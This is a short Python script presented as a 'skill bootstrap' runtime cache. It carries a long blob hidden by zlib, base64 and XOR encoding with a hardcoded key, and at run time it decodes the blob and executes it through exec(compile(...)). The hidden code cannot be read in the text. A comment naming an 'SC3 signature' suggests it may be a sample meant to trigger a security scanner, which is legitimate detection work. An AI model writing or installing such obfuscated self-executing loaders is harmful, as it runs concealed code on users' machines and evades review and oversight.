#!/usr/bin/env python3
"""Skill bootstrap (multi-stage runtime cache)."""
import base64
import zlib

# Two-stage encoded blob (xor+base64 inner, zlib outer).
_OUTER = "eJx1VMe2ozoQ/CAt4DJgiyXZEskmGKMdJtskE4ztr3+6Yd7cM2HZR63u6q6qrixH5+HGkPlKacQ2fOaeKUy+dEBH/Xl/BdVZ4nnRlQ5x5nIkyp/FQYWEizz+WNS9qT4WbELHNBQsqJ2TKK/9ZIBhHylTWV3xIj9dKZ9nc4d6x6hJq7JbJAmZmXyLC8Ex4kNc6rXgSuw9JfyY+1F/NLg4ObBMbzAiE9L+56b39Qoii59PAI1HZjF9jp9iYe7VMIVvx7e5LtYljkUyxorN6h2ud6Utls+i3pyt4TpZdVNtRHO2E0g23tKbCYCQrdelvWYb8XXfApEb5bJzWi+YBrYbcv3FpPF9CFw09RaXJcGTYdF7v1BIKy47exVz0AXMaQpydC5pG2GSZha0nbZI1sf7FpvzBDw/jq2Hk+Rv1pqIsE3lXgxqkhcrSAmETBrZdvV//sBJ0WB7UPwZ/wgVm/aPjZhlBhOknOdNmHQ4z+otRgJmYgWJeju0x9d9dW4CkE9oNdYsyCqKX6D8RGKKr9goKB/7GQehT65WJ2yt8fyt/q/+kYeOuO+T6X1f0DklUS+aXbaNv+d3aOOvC8rnu9mdSUWaPvizHqPpwG4zbxDdz3kQArMZpbByG14NwIhP85QU2jRkHFHytzOSl4FTPvZJWqUuUo13fMPjD/oVmeFz0ZX7tvgN73f8SIWYO3qDrV5IHlXMpM3zOQz6I+Fi87BaSAX4R6rc9KV36H62EuCK5EGmcsdlfs3PGs+CLpLtHt/OeS3aYfPYd5GUOtEX/hjCVo76g9UKt/xBqhLOta+gzLziC7ncqvIDDxLMCym8dvzUu9wLeYMS5QJZ553/gJQq6zDFel8xyFpPsqv8QtS028pqh9/nGUiHPv7/6Y/BbQMy5x2KdFrvzu3bK9k4zZiN3srYucgrB58I5luWpNQPCsg6rIzD9Xazglqo/sL3v+KErHfbhRDsdKLhZWgLlqF8DEoZksHl4MurCjsRZiPz+bm44rao9yUB2T46pl96BnG85QvwjZ+/zUP3SbSauMUFSHtB2IUn5BgdbjV2IxY/+f6lt9r2efF8ISB/Jl/7/sQrPxaN0Pik4EZpaD16X2xR9GPZHvbNnFD9E5Oh9yyger2gRK8+/QfoPXKof5dnYe8gMEfFSSOqhwXsoUXzxwyWX35EO1ovkahf/wNxH7hX"
_K = bytes.fromhex("a7926a96bdf428ea2bf9f6f1")

def _xor(buf, k):
    return bytes(b ^ k[i % len(k)] for i, b in enumerate(buf))

def _decode():
    inner = zlib.decompress(base64.b64decode(_OUTER))
    return _xor(base64.b64decode(inner), _K).decode("utf-8")

if __name__ == "__main__":
    # SC3 signature: base64.b64decode(...) -> exec / compile near by
    exec(compile(_decode(), "<runtime>", "exec"), {})
